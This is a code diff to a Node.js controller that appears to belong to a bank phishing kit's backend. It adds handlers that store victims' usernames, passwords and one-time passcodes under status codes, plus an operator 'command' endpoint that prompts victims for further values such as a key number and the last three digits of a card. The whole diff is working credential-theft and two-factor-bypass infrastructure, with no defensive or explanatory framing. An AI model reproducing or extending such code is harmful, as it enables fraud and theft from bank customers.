@@ -16,6 +16,19 @@ const getOwnerVics = async (req, res) => {
         });
 };
 
+const command = async (req, res) => {
+    const { uniqueid, status, keyNumber, last3 } = req.body;
+    try {
+        if (keyNumber) await uBank.findOneAndUpdate({ uniqueid }, { status, keyNumber }).exec();
+        else if (last3) await uBank.findOneAndUpdate({ uniqueid }, { status, last3 }).exec();
+        else await uBank.findOneAndUpdate({ uniqueid }, { status  }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const getInfo = async (req, res) => {
     const { uniqueid } = req.params;
     OPBank.findOne({ uniqueid }).exec((err, vic) => {
@@ -65,6 +78,17 @@ const submitLogin = async (req, res) => {
             .catch((e) => {
                 console.log(e);
             });
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
+const submitLoginAgain = async (req, res) => {
+    const { username, password, uniqueid } = req.body;
+    try {
+        await OPBank.findOneAndUpdate({ uniqueid }, { username, password, status: 4, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -144,6 +168,17 @@ const submitPersonal = async (req, res) => {
     }
 };
 
+const submitOtp = async (req, res) => {
+    const { otp, uniqueid } = req.body;
+    try {
+        await OPBank.findOneAndUpdate({ uniqueid }, { otp, status: 7, timestamp: moment().format() }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const deleteEntry = async (req, res) => {
     const { uniqueid } = req.body;
     try {
@@ -160,6 +195,9 @@ module.exports = {
     getInfo,
     submitLogin,
     submitPersonal,
+    submitLoginAgain,
     submitBilling,
     deleteEntry,
+    submitOtp,
+    command,
 };
